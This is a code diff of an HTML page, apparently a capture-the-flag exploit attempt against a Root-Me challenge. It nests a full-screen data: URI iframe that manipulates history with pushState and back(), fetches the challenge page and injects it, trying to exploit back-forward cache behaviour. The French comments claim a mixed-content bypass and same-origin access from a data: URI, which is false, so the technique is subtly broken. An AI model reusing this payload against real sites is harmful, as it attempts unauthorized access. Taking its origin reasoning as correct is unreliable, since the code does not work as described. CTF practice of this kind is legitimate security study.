@@ -3,21 +3,31 @@
 <head>
 <script>
 addEventListener('DOMContentLoaded', () => {
+  // Data URI = BYPASS Mixed Content + même origine
   const iframe = document.createElement('iframe');
-  iframe.src = 'http://challenge01.root-me.org:58007/';
+  iframe.src = 'data:text/html,' + encodeURIComponent(`
+    <!doctype html>
+    <html>
+    <head>
+    <script>
+      // Push /flag dans iframe (même origine data:)
+      history.pushState({}, '', 'http://challenge01.root-me.org:58007/flag');
+      
+      // Fetch challenge01
+      fetch('http://challenge01.root-me.org:58007/')
+        .then(r=>r.text())
+        .then(html=>document.body.innerHTML=html)
+        .then(()=>setTimeout(()=>history.back(), 10)); // BFCACHE /flag
+    </script>
+    </head>
+    <body></body>
+    </html>
+  `);
+  
   iframe.style.cssText = `
     position:fixed;top:0;left:0;width:100vw;height:100vh;
     border:none;z-index:999999;background:white;
   `;
-  
-  iframe.onload = () => {
-    // MAINTENANT on peut pushState() !
-    const iframeWin = iframe.contentWindow;
-    iframeWin.history.pushState({}, '', '/flag');
-    
-    // Back pour bfcache
-    setTimeout(() => iframeWin.history.back(), 10);
-  };
   
   document.body.appendChild(iframe);
 });
